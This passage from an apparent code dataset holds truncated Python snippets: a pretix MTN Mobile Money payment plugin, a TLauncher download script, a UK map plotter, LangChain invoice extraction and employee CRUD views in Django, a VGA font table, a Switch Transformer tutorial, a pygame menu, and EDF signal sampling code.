\"Sandbox\"),\n    (\"mtnuganda\", \"MTN Uganda\"),\n    (\"mtnghana\", \"MTN Ghana\"),\n    (\"mtnivorycoast\", \"MTN Ivory Coast\"),\n    (\"mtnzambia\", \"MTN Zambia\"),\n    (\"mtncameroon\", \"MTN Cameroon\"),\n    (\"mtnbenin\", \"MTN Benin\"),\n    (\"mtncongo\", \"MTN Congo\"),\n    (\"mtnswaziland\", \"MTN Swaziland\"),\n    (\"mtnguineaconakry\", \"MTN Guinea Conakry\"),\n    (\"mtnsouthafrica\", \"MTN South Africa\"),\n    (\"mtnliberia\", \"MTN Liberia\"),\n)\n\n\ndef get_token(base_url, subscription_key, api_user_id, api_secret, api=\"collection\"):\n    # Then we get all the items that make up the current credentials and create a hash to detect changes\n    checksum = hashlib.sha256(\n        \"\".join([subscription_key, api_user_id, api_secret, api]).encode()\n    ).hexdigest()\n    cache_key_hash = f\"pretix_mtn_momo_token_hash_{checksum}\"\n    token_hash = cache.get(cache_key_hash)\n\n    if token_hash:\n        return token_hash[\"access_token\"]\n\n    r = requests.post(\n        urljoin(\n            base_url,\n            f\"/{api}/token/\",\n        ),\n        auth=(api_user_id, api_secret),\n        headers={\n            \"Ocp-Apim-Subscription-Key\": subscription_key,\n        },\n    )\n    r.raise_for_status()\n    token_hash = r.json()\n\n    cache.set(cache_key_hash, token_hash, token_hash[\"expires_in\"] - 120)\n    return token_hash[\"access_token\"]\n\n\nclass MTNMoMo(BasePaymentProvider):\n    identifier = \"mtn_momo\"\n    verbose_name = _(\"MTN Mobile Money\")\n    public_name = _(\"MTN Mobile Money\")\n\n    @property\n    def settings_form_fields(self):\n        fields = [\n            (\n                \"baseurl\",\n                forms.URLField(\n                    label=_(\"Base URL\"),\n                ),\n            ),\n            (\n                \"environment\",\n                forms.ChoiceField(\n                    label=_(\"Environment\"),\n                    choices=ENVIRONMENTS,\n                ),\n            ),\n            (\n                \"api_user_id\",\n                forms.CharField(\n                    label=_(\"API User ID\"),\n                ),\n            ),\n            (\n                \"api_secret\",\n                SecretKeySettingsField(\n                    label=_(\"API secret\"),\n                ),\n            ),\n            (\n                \"subscription_key\",\n                SecretKeySettingsField(\n                    label=_(\"Collection subscription key\"),\n                ),\n            ),\n            (\n                \"refund_subscription_key\",\n                SecretKeySettingsField(\n                    label=_(\"Disbursement API Subscription key\"),\n                    required=False,\n                ),\n            ),\n        ]\n        d = OrderedDict(fields + list(super().settings_form_fields.items()))\n        d.move_to_end(\"_enabled\", last=False)\n        return d\n\n    def __init__(self, event: Event):\n        super().__init__(event)\n        self.settings = SettingsSandbox(\"payment\", \"mtn_momo\", event)\n\n    def payment_refund_supported(self, payment: OrderPayment) -> bool:\n        return self.settings.refund_subscription_key\n\n    def payment_partial_refund_supported(self, payment: OrderPayment) -> bool:\n        return self.settings.refund_subscription_key\n\n    def payment_can_retry(self, payment):\n        return self._is_still_available(order=payment.order)\n\n    def shred_payment_info(self, obj: OrderPayment):\n        if not obj.info:\n            return\n        d = obj.info_data\n        d[\"payer\"] = {\"_shredded\": True}\n        d[\"_shredded\"] = True\n        obj.info = json.dumps(d)\n        obj.save(update_fields=[\"info\"])\n\n    def test_mode_message(self) -> str:\n        if self.settings.environment == \"sandbox\":\n            if self.settings.test_merchant_account and self.settings.test_api_key:\n                return mark_safe(\n                    _(\n                        \"The Mobile Money plugin is operating in test mode. You can use any phone number to test, or one \"\n                        \"of <a {args}>a few test numbers</a> to create a failed tra",
    "from urllib.request import urlretrieve\nimport json\nimport os\nimport time\n\n\ndef space():\n    os.system(\"\")\n\ndef clear_output():\n    os.system(\"clear\")\n\ndef logo_outputer():\n    clear_output()\n    space()\n    with open(\"Logo.json\", \"r\") as json_file:\n        ascii_art_data = json.load(json_file)\n        ascii_art = ascii_art_data[\"ascii_art\"]\n        print(ascii_art)\n        space()\n\ndef install():\n    url_package = \"https://tlauncher.org/jar\"\n    filename = \"TLauncher-2.899.zip\"\n    urlretrieve(url_package, filename)\n\ndef unzip():\n    os.system(\"unzip TLauncher-2.899.zip\")\n\ndef delete():\n    os.system(\"rm -f TLauncher-2.899.zip\")\n    os.system(\"rm -f README-EN.txt\")\n    os.system(\"rm -f README-RUS.txt\")\n\ndef rename():\n    old_file_name = \"TLauncher-2.899.jar\"\n    new_file_name = \"TLauncher-2.86.jar\"\n    if os.path.exists(old_file_name):\n        os.rename(old_file_name, new_file_name)\n\n\nlogo_outputer()\nprint(\"  This Program Going To Download Tlauncher.\")\n\ntime.sleep(1)\nget_request = input(\"   Do You Wanna Continue Downloading? [Y/n]: \")\n\nminefile = \"TLauncher-2.86.jar\"\n\n\nif get_request == \"n\":\n    space()\n    clear_output(), print(\"  Program Closed, By The User.\")\n    space()\n    exit()\n\nif os.path.exists(minefile):\n    clear_output()\n    logo_outputer()\n    print(\"   Minecraft Already Exists.\\n  It can Be run by './main.sh' file.\")\n    exit()\n\nif get_request.lower() == \"y\":\n    try:    \n        install()\n        clear_output()\n        logo_outputer()\n        unzip()\n        os.system(\"chmod +x main.sh\")\n        delete()\n        rename()\n        if os.path.exists(path=\"TLauncher-2.86.jar\"):\n            space()\n            print(f\"  Minecraft Successfully Downloaded.\\n can be runned by executting command. './main.sh'\")\n            space()\n        else:\n            clear_output()\n            logo_outputer()\n            space()\n            print(\"  Minecraft Failed To install.\")\n            space()\n        space()\n    except FileNotFoundError:\n        clear_output()\n        logo_outputer()\n        space()\n        print(\"  Installation Failed. (Cannot Find The File.)\")\n        space()\n        time.sleep(0.9)\nelse:\n    space()\n\nif get_request.lower() == \"n\":\n    time.sleep(0.8)\n    clear_output()\n    exit()\n",
    "\"\"\"A class that plots longitude/latitude points on a UK map background.\r\nNo projection is applied so some warping will occur. The Basemap toolkit\r\nfor matplotlib handles maps/projections better but is not installed by\r\ndefault on the university machines. This is a simple alternative.\"\"\"\r\n\r\nimport matplotlib.pyplot as plt\r\n\r\nclass UKMap:\r\n    def __init__(self):\r\n        m = plt.imread(\"Gb4dot_merged_mapcolors.png\")\r\n        plt.imshow(m, extent=[-9,2,50,59])\r\n        plt.axis([-9,2,50,59])\r\n        \r\n    def plot(self, x, y, marker='.', markersize='2', color='blue'):\r\n        \"\"\"Plot a single point on the map.\r\n        Note: Parameter x should be longitude, and y should be latitude\"\"\"\r\n        plt.plot(x, y, marker=marker, markersize=markersize, color=color)\r\n\r\n    def show(self):\r\n        plt.show()\r\n\r\n    def savefig(self,*args,**kwargs):\r\n        \"\"\"Just call matplotlib's savefig method directly with all the arguments\"\"\"\r\n        plt.savefig(*args, **kwargs)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    m = UKMap()\r\n    #53.99,-1.04\r\n    m.plot(-1.04, 53.99, marker='o')\r\n    m.plot(-4.064598, 52.41616, marker='o')\r\n    m.show()\r\n",
    "from django.shortcuts import render\n\nfrom django.http.response import JsonResponse\nfrom rest_framework.parsers import JSONParser \nfrom rest_framework import status\n \nfrom invoice.models import Invoice\nfrom invoice.serializers import InvoiceSerializer\nfrom rest_framework.decorators import api_view\nfrom rest_framework.decorators import api_view, permission_classes\nfrom rest_framework import permissions\n\n\nfrom langchain_community.document_loaders import PyPDFLoader\nfrom langchain_community.vectorstores import Chroma\n\nfrom langchain_openai import OpenAIEmbeddings\nfrom langchain_community.document_loaders import UnstructuredPDFLoader\n# from langchain.llms import OpenAI\nfrom langchain_openai import ChatOpenAI\nfrom langchain.chains.question_answering import load_qa_chain\nfrom langchain.schema import HumanMessage, SystemMessage\nimport os\nfrom drf_yasg.utils import swagger_auto_schema\nfrom drf_yasg import openapi\nfrom rest_framework.decorators import api_view, parser_classes\nfrom rest_framework.parsers import MultiPartParser\nimport json\n\n\nopenai_api_key = ''\nos.environ[\"OPENAI_API_KEY\"] = ''\n\nfine_tuned_model = ChatOpenAI(\n    temperature=0, model_name=\"gpt-4\"\n)\n\n\n@swagger_auto_schema(method='post', manual_parameters=[\n    openapi.Parameter('title', openapi.IN_FORM, description=\"Title of the PDF file\", type=openapi.TYPE_STRING),\n    openapi.Parameter('pdf_file', openapi.IN_FORM, description=\"PDF file to upload\", type=openapi.TYPE_FILE),\n])\n@api_view(['POST'])\n@parser_classes([MultiPartParser])\n@permission_classes((permissions.AllowAny,))\ndef upload_invoice(request):\n    if request.method == 'POST' and request.FILES.get('pdf_file'):\n        uploaded_file = request.FILES['pdf_file']\n        file_path = os.path.join( 'SOURCE_DOCUMENTS', uploaded_file.name)\n        os.makedirs(os.path.dirname(file_path), exist_ok=True)\n\n        with open(file_path, 'wb+') as destination:\n            for chunk in uploaded_file.chunks():\n                destination.write(chunk)\n\n        loader = PyPDFLoader(file_path)    \n        pages = loader.load_and_split() \n        embeddings = OpenAIEmbeddings()\n        docsearch = Chroma.from_documents(pages, embeddings).as_retriever()\n\n        # Choose any query of your choice\n        query = \"I need the following data identified correctly: Company name, Company address, Sales tax ID, Bank details, Invoice Due date, Invoice number,Product Price, Tax in %, Total price, Bezeichnung name. Give me the result like 'Company name: blablabla\\n Company address:blablabla\\n ...'\"\n        docs = docsearch.get_relevant_documents(query)\n\n        chain = load_qa_chain(ChatOpenAI(temperature=0), chain_type=\"stuff\")\n        invoice_info = chain.run(input_documents=docs, question=query)\n        # invoice_info = \"Company name: Grover Group GmbH\\nCompany address: Holzmarktstr. 11, 10179 Berlin, Germany\\nSales tax ID: DE300852104\\nBank details: \\n- IBAN: DE17 1004 0000 0277 7365 06\\n- BIC: COBADEFFXXX\\nInvoice date: 28.03.2022\\nInvoice number: R572332523-S-0000503244-07M\\nProduct description:\\n- Apple Tablet Apple 12.9\\\" iPad Pro Wi-Fi + LTE 128GB (2020) (Silver)\\n- Quantity: 1\\n- Monthly price: 39,90 \u20ac\\n- Tax rate: 19%\\n- Total price: 39,90 \u20ac (including 6,37 \u20ac VAT)\\nBezeichnung name: Not provided in the given context\\nPosting account name: Not provided in the given contex\"\n        \n\n        messages = [\n            SystemMessage(\n                content=\"You are a helpful assistant about booking account\"\n            ),\n            HumanMessage(\n                content=\"Which expense account to be used for these info: \"+ invoice_info+ \"? I only need the names.\" \n            ),\n        ]\n        invoice_account = fine_tuned_model(messages).content\n        # invoice_account = \"Based on the information provided, it's not possible to determine the exact expense account to be used as it depends on the company's specific chart of accounts. However, typically, the purchase of an iPad for business use could be categorized under one of the following expense accounts:\\n\\n1. Office Supplies Expense\\n2. Computer Equipment Expense\\n3. Technology Expense\\n\\nPlease consult with your company's accountant or financial advisor to determine the most appropriate account for this expense.\"\n\n        # Split the invoice_info into lines and extract key-value pairs\n        lines = invoice_info.split('\\n')\n        invoice_data = {}\n        current_key = None\n\n        for line in lines:\n            if ':' in line:\n                current_key, value = line.split(':', 1)\n                invoice_data[current_key.strip()] = value.strip()\n            elif current_key:\n                invoice_data[current_key] += ' ' + line.strip()\n        invoice_data['Posting account names'] = invoice_account\n        # Convert to JSON\n        json_data = json.dumps(invoice_data, indent=2)\n\n        # Write to a JSON file\n        with open('invoice_data.json', 'w') as json_file:\n            json_file.write(json_data)\n            \n        # invoice = Invoice(title = t",
    "\"\"\"converted from vga_8x16.bin \"\"\"\r\nWIDTH = 8\r\nHEIGHT = 16\r\nFIRST = 0x20\r\nLAST = 0x7f\r\n_FONT =\\\r\nb'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x18\\x3c\\x3c\\x3c\\x18\\x18\\x18\\x00\\x18\\x18\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x66\\x66\\x66\\x24\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x00\\x6c\\x6c\\xfe\\x6c\\x6c\\x6c\\xfe\\x6c\\x6c\\x00\\x00\\x00\\x00'\\\r\nb'\\x18\\x18\\x7c\\xc6\\xc2\\xc0\\x7c\\x06\\x06\\x86\\xc6\\x7c\\x18\\x18\\x00\\x00'\\\r\nb'\\x00\\x00\\x00\\x00\\xc2\\xc6\\x0c\\x18\\x30\\x60\\xc6\\x86\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x38\\x6c\\x6c\\x38\\x76\\xdc\\xcc\\xcc\\xcc\\x76\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x30\\x30\\x30\\x60\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x0c\\x18\\x30\\x30\\x30\\x30\\x30\\x30\\x18\\x0c\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x30\\x18\\x0c\\x0c\\x0c\\x0c\\x0c\\x0c\\x18\\x30\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x00\\x00\\x00\\x66\\x3c\\xff\\x3c\\x66\\x00\\x00\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x00\\x00\\x00\\x18\\x18\\x7e\\x18\\x18\\x00\\x00\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x18\\x18\\x18\\x30\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xfe\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x18\\x18\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x00\\x00\\x02\\x06\\x0c\\x18\\x30\\x60\\xc0\\x80\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x38\\x6c\\xc6\\xc6\\xd6\\xd6\\xc6\\xc6\\x6c\\x38\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x18\\x38\\x78\\x18\\x18\\x18\\x18\\x18\\x18\\x7e\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x7c\\xc6\\x06\\x0c\\x18\\x30\\x60\\xc0\\xc6\\xfe\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x7c\\xc6\\x06\\x06\\x3c\\x06\\x06\\x06\\xc6\\x7c\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x0c\\x1c\\x3c\\x6c\\xcc\\xfe\\x0c\\x0c\\x0c\\x1e\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\xfe\\xc0\\xc0\\xc0\\xfc\\x06\\x06\\x06\\xc6\\x7c\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x38\\x60\\xc0\\xc0\\xfc\\xc6\\xc6\\xc6\\xc6\\x7c\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\xfe\\xc6\\x06\\x06\\x0c\\x18\\x30\\x30\\x30\\x30\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x7c\\xc6\\xc6\\xc6\\x7c\\xc6\\xc6\\xc6\\xc6\\x7c\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x7c\\xc6\\xc6\\xc6\\x7e\\x06\\x06\\x06\\x0c\\x78\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x00\\x00\\x18\\x18\\x00\\x00\\x00\\x18\\x18\\x00\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x00\\x00\\x18\\x18\\x00\\x00\\x00\\x18\\x18\\x30\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x00\\x06\\x0c\\x18\\x30\\x60\\x30\\x18\\x0c\\x06\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x00\\x00\\x00\\x7e\\x00\\x00\\x7e\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x00\\x60\\x30\\x18\\x0c\\x06\\x0c\\x18\\x30\\x60\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x7c\\xc6\\xc6\\x0c\\x18\\x18\\x18\\x00\\x18\\x18\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x00\\x7c\\xc6\\xc6\\xde\\xde\\xde\\xdc\\xc0\\x7c\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x10\\x38\\x6c\\xc6\\xc6\\xfe\\xc6\\xc6\\xc6\\xc6\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\xfc\\x66\\x66\\x66\\x7c\\x66\\x66\\x66\\x66\\xfc\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x3c\\x66\\xc2\\xc0\\xc0\\xc0\\xc0\\xc2\\x66\\x3c\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\xf8\\x6c\\x66\\x66\\x66\\x66\\x66\\x66\\x6c\\xf8\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\xfe\\x66\\x62\\x68\\x78\\x68\\x60\\x62\\x66\\xfe\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\xfe\\x66\\x62\\x68\\x78\\x68\\x60\\x60\\x60\\xf0\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x3c\\x66\\xc2\\xc0\\xc0\\xde\\xc6\\xc6\\x66\\x3a\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\xc6\\xc6\\xc6\\xc6\\xfe\\xc6\\xc6\\xc6\\xc6\\xc6\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x3c\\x18\\x18\\x18\\x18\\x18\\x18\\x18\\x18\\x3c\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x1e\\x0c\\x0c\\x0c\\x0c\\x0c\\xcc\\xcc\\xcc\\x78\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\xe6\\x66\\x66\\x6c\\x78\\x78\\x6c\\x66\\x66\\xe6\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\xf0\\x60\\x60\\x60\\x60\\x60\\x60\\x62\\x66\\xfe\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\xc6\\xee\\xfe\\xfe\\xd6\\xc6\\xc6\\xc6\\xc6\\xc6\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\xc6\\xe6\\xf6\\xfe\\xde\\xce\\xc6\\xc6\\xc6\\xc6\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x7c\\xc6\\xc6\\xc6\\xc6\\xc6\\xc6\\xc6\\xc6\\x7c\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\xfc\\x66\\x66\\x66\\x7c\\x60\\x60\\x60\\x60\\xf0\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x7c\\xc6\\xc6\\xc6\\xc6\\xc6\\xc6\\xd6\\xde\\x7c\\x0c\\x0e\\x00\\x00'\\\r\nb'\\x00\\x00\\xfc\\x66\\x66\\x66\\x7c\\x6c\\x66\\x66\\x66\\xe6\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x7c\\xc6\\xc6\\x60\\x38\\x0c\\x06\\xc6\\xc6\\x7c\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x7e\\x7e\\x5a\\x18\\x18\\x18\\x18\\x18\\x18\\x3c\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\xc6\\xc6\\xc6\\xc6\\xc6\\xc6\\xc6\\xc6\\xc6\\x7c\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\xc6\\xc6\\xc6\\xc6\\xc6\\xc6\\xc6\\x6c\\x38\\x10\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\xc6\\xc6\\xc6\\xc6\\xd6\\xd6\\xd6\\xfe\\xee\\x6c\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\xc6\\xc6\\x6c\\x7c\\x38\\x38\\x7c\\x6c\\xc6\\xc6\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x66\\x66\\x66\\x66\\x3c\\x18\\x18\\x18\\x18\\x3c\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\xfe\\xc6\\x86\\x0c\\x18\\x30\\x60\\xc2\\xc6\\xfe\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x3c\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x30\\x3c\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x00\\x80\\xc0\\xe0\\x70\\x38\\x1c\\x0e\\x06\\x02\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x3c\\x0c\\x0c\\x0c\\x0c\\x0c\\x0c\\x0c\\x0c\\x3c\\x00\\x00\\x00\\x00'\\\r\nb'\\x10\\x38\\x6c\\xc6\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xff\\x00\\x00'\\\r\nb'\\x00\\x30\\x18\\x0c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x00\\x00\\x00\\x78\\x0c\\x7c\\xcc\\xcc\\xcc\\x76\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\xe0\\x60\\x60\\x78\\x6c\\x66\\x66\\x66\\x66\\x7c\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x00\\x00\\x00\\x7c\\xc6\\xc0\\xc0\\xc0\\xc6\\x7c\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x1c\\x0c\\x0c\\x3c\\x6c\\xcc\\xcc\\xcc\\xcc\\x76\\x00\\x00\\x00\\x00'\\\r\nb'\\x00\\x00\\x00\\x00\\x00\\x7c\\xc6\\xfe\\xc0\\xc0\\xc6\\x7c\\x00\\x00\\x00\\x00'\\\r\nb'\\",
    "from django.shortcuts import render, redirect\n\n# Create your views here.\nfrom .models import Employee\n\n# Create Employee\n\ndef insert_emp(request):\n    if request.method == \"POST\":\n        EmpId = request.POST['EmpId']\n        EmpName = request.POST['EmpName']\n        EmpGender = request.POST['EmpGender']\n        EmpEmail = request.POST['EmpEmail']\n        EmpDesignation = request.POST['EmpDesignation']\n        data = Employee(EmpId=EmpId, EmpName=EmpName, EmpGender=EmpGender, EmpEmail=EmpEmail, EmpDesignation= EmpDesignation)\n        data.save()\n  \n        return redirect('show/')\n    else:\n        return render(request, 'insert.html')\n    \ndef show_emp(request):\n    employees = Employee.objects.all()\n    return render(request,'show.html',{'employees':employees} )\n    \ndef edit_emp(request,pk):\n    employees = Employee.objects.get(id=pk)\n    if request.method == 'POST':\n            print(request.POST)\n            employees.EmpName = request.POST['EmpName']\n            employees.EmpGender = request.POST['EmpGender']\n            employees.EmpEmail = request.POST['EmpEmail']\n            employees.EmpDesignation = request.POST['EmpDesignation']\n            employees.EmpDesignation = request.POST['EmpDesignation']\n            employees.save()   \n            return redirect('/show')\n    context = {\n        'employees': employees,\n    }\n\n    return render(request,'edit.html',context)\n\ndef remove_emp(request, pk):\n    employees = Employee.objects.get(id=pk)\n\n    if request.method == 'POST':\n        employees.delete()\n        return redirect('/show')\n\n    context = {\n        'employees': employees,\n    }\n\n    return render(request, 'delete.html', context)",
    "\"\"\"\n---\ntitle: Switch Transformer\nsummary: >\n  This is an annotated implementation/tutorial a miniature version of Switch Transformer in PyTorch.\n---\n\n# Switch Transformer\n\nThis is a miniature [PyTorch](https://pytorch.org) implementation of the paper\n[Switch Transformers: Scaling to Trillion Parameter Models with Simple and Efficient Sparsity](https://arxiv.org/abs/2101.03961).\nOur implementation only has a few million parameters and doesn't do model parallel distributed training.\nIt does single GPU training, but we implement the concept of switching as described in the paper.\n\nThe Switch Transformer uses different parameters for each token by switching among parameters\nbased on the token.\nTherefore, only a fraction of parameters are chosen for each token.\nSo you can have more parameters but less computational cost.\n\nThe switching happens at the Position-wise Feedforward network (FFN) of each transformer block.\nPosition-wise feedforward network consists of two sequentially fully connected layers.\nIn switch transformer we have multiple FFNs (multiple experts),\nand we chose which one to use based on a router.\nThe output is a set of probabilities for picking a FFN,\nand we pick the one with the highest probability and only evaluate that.\nSo essentially the computational cost is the same as having a single FFN.\nIn our implementation this doesn't parallelize well when you have many or large FFNs since it's all\nhappening on a single GPU.\nIn a distributed setup you would have each FFN (each very large) on a different device.\n\nThe paper introduces another loss term to balance load among the experts (FFNs) and\ndiscusses dropping tokens when routing is not balanced.\n\nHere's [the training code](experiment.html) and a notebook for training a switch transformer on Tiny Shakespeare dataset.\n\n[![Open In Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/github/labmlai/annotated_deep_learning_paper_implementations/blob/master/labml_nn/transformers/switch/experiment.ipynb)\n\"\"\"\n\nimport torch\nfrom torch import nn\n\nfrom labml_helpers.module import Module\nfrom labml_nn.transformers.feed_forward import FeedForward\nfrom labml_nn.transformers.mha import MultiHeadAttention\nfrom labml_nn.utils import clone_module_list\n\n\nclass SwitchFeedForward(Module):\n    \"\"\"\n    ## Routing among multiple FFNs\n    \"\"\"\n\n    def __init__(self, *,\n                 capacity_factor: float,\n                 drop_tokens: bool,\n                 is_scale_prob: bool,\n                 n_experts: int,\n                 expert: FeedForward,\n                 d_model: int):\n        \"\"\"\n        * `capacity_factor` is the capacity of each expert as a factor relative to ideally balanced load\n        * `drop_tokens` specifies whether to drop tokens if more tokens are routed to an expert than the capacity\n        * `is_scale_prob` specifies whether to multiply the input to the FFN by the routing probability\n        * `n_experts` is the number of experts\n        * `expert` is the expert layer, a [FFN module](../feed_forward.html)\n        * `d_model` is the number of features in a token embedding\n        * `d_ff` is the number of features in the hidden layer of the FFN\n        * `dropout` is dropout probability in the FFN\n        \"\"\"\n        super().__init__()\n\n        self.capacity_factor = capacity_factor\n        self.is_scale_prob = is_scale_prob\n        self.n_experts = n_experts\n        self.drop_tokens = drop_tokens\n\n        # make copies of the FFNs\n        self.experts = clone_module_list(expert, n_experts)\n        # Routing layer and softmax\n        self.switch = nn.Linear(d_model, n_experts)\n        self.softmax = nn.Softmax(dim=-1)\n\n    def forward(self, x: torch.Tensor):\n        \"\"\"\n        * `x` is the input to the switching module with shape `[seq_len, batch_size, d_model]`\n        \"\"\"\n\n        # Capture the shape to change shapes later\n        seq_len, batch_size, d_model = x.shape\n        # Flatten the sequence and batch dimensions\n        x = x.view(-1, d_model)\n\n        # Get routing probabilities for each of the tokens.\n        # $$p_i(x) = \\frac{e^{h(x)_i}}{\\sum^N_j e^{h(x)_j}}$$\n        # where $N$ is the number of experts `n_experts` and\n        # $h(\\cdot)$ is the linear transformation of token embeddings.\n        route_prob = self.softmax(self.switch(x))\n\n        # Get the maximum routing probabilities and the routes.\n        # We route to the expert with highest probability\n        route_prob_max, routes = torch.max(route_prob, dim=-1)\n\n        # Get indexes of tokens going to each expert\n        indexes_list = [torch.eq(routes, i).nonzero(as_tuple=True)[0] for i in range(self.n_experts)]\n\n        # Initialize an empty tensor to store outputs\n        final_output = x.new_zeros(x.shape)\n\n        # Capacity of each expert.\n        # $$\\mathrm{expert\\;capacity} =\n        # \\frac{\\mathrm{tokens\\;per\\;batch}}{\\mathrm{number\\;of\\;experts}}\n        # \\times \\mathrm{capacity\\;factor}$$\n        capacity = i",
    "\nGRAY = (200, 200, 200)\n\ndef draw_text(text, font, color, surface, x, y):\n    textobj = font.render(text, 1, color)\n    textrect = textobj.get_rect()\n    textrect.topleft = (x, y)\n    surface.blit(textobj, textrect)\n\ndef title_screen():\n    font = pygame.font.Font(None, 36)\n    running = True\n\n    while running:\n        screen.fill(BLACK)\n        draw_text(\"Super Awesome Platform Game\", font, WHITE, screen, WIDTH/2 - 100, HEIGHT/2 - 100)\n\n         # Start button\n        start_button = pygame.Rect(WIDTH/2 - 100, HEIGHT/2, 200, 50)\n        pygame.draw.rect(screen, GRAY, start_button)\n        draw_text(\"Start Game\", font, BLACK, screen, start_button.x + 20, start_button.y + 10)\n\n        # Exit button\n        exit_button = pygame.Rect(WIDTH/2 - 100, HEIGHT/2 + 100, 200, 50)\n        pygame.draw.rect(screen, GRAY, exit_button)\n        draw_text(\"Exit Game\", font, BLACK, screen, exit_button.x + 20, exit_button.y + 10)\n\n        for event in pygame.event.get():\n            if event.type == pygame.QUIT:\n                pygame.quit()\n                sys.exit()\n            if event.type == pygame.MOUSEBUTTONDOWN:\n                mouse_pos = event.pos\n\n                if start_button.collidepoint(mouse_pos):\n                    running = False  # Exit the title screen and start the game\n                elif exit_button.collidepoint(mouse_pos):\n                    pygame.quit()\n                    sys.exit()\n\n        pygame.display.update()\n\n        pygame.time.Clock().tick(30)\n",
    "from EdfData import Edf, Channel\nfrom SampleSequence import SampleSeq\nfrom BaseNormalizer import BaseNormalizer\nfrom BaseSampler import BaseSampler\nfrom typing import List\nimport os\nfrom Workflow import Workflow\nimport matplotlib.pyplot as plt\n\ndef main():\n    path = \"001.edf\"\n    edf = Edf(path)\n    sampler = BaseSampler(edf.k_complex_time, 1500)\n    normalizer = BaseNormalizer()\n    workflow = Workflow(edf).set_sampler(sampler).set_normalizer(normalizer)\n    workflow.export_sample(\"./postive\")\n\ndef test():\n    path = \"001.edf\"\n    edf = Edf(path)\n    sampler = BaseSampler(edf.k_complex_time[0:1], 6000)\n    sample = sampler.sample(edf.channel_C3)[0]\n    plt.subplot(2, 1, 1)\n    sample.show_plot()\n    # plt.show()\n    new_ample = BaseNormalizer().normalize(sample)\n    plt.subplot(2, 1, 2)\n    new_ample.show_plot(\"normalized\")\n    # plt.show()\n    tmp = 0\n\ndef export_all():\n    path = 